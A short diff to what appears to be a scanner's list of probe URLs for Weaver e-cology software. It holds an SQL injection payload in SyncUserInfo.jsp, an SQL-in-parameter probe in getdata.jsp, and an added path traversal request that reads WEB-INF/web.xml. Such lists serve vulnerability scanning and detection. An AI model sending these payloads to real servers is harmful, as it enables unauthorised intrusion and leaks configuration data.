@@ -1,2 +1,3 @@
 /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null
 /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+547653*865674+as+id
+/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
